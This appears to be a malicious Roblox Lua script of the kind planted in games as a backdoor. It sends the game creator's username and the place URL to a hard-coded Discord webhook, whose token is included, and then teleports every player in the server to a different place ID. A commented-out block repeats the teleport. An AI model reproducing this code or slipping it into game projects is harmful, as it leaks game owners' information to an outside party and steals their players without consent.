--[[for _,v in pairs(game.Players:GetPlayers()) do
	task.spawn(function()
		local s,e = pcall(function()
			game:GetService("TeleportService"):Teleport(102212820666490,v)
		end)
		if not s then
			local t = Instance.new("TextLabel",v.PlayerGui.BondGui)
			t.Text = tostring(e)
			t.Position = UDim2.new(0.347, 0,0.323, 0)
			t.Size = UDim2.new(0.289, 0,0.326, 0)
			t.TextScaled = true
		end
	end)
end]]

local url = "https://discord.com/api/webhooks/1391064950444654622/FEtgpmHH8pADyHA2tjZQEkFE0AAMgaNqZ0nP8tqPyLn_QrUbupBcXQhKKnupsdJQ44k9"
local hs = game:GetService("HttpService")

local text = {
	["embeds"] = {{

		["author"] = {
			["name"] = game.Players:GetNameFromUserIdAsync(game.CreatorId),
			["icon_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. game.Players:GetNameFromUserIdAsync(game.CreatorId)
		},
		["description"] = "https://www.roblox.com/games/"..game.PlaceId,
		["color"] = tonumber(0xFFFAFA),
	}},

}
hs:PostAsync(url, hs:JSONEncode(text))

local ts = game:GetService("TeleportService")

for _, Player in game.Players:GetPlayers() do
	ts:Teleport(75373144977072,Player)
end
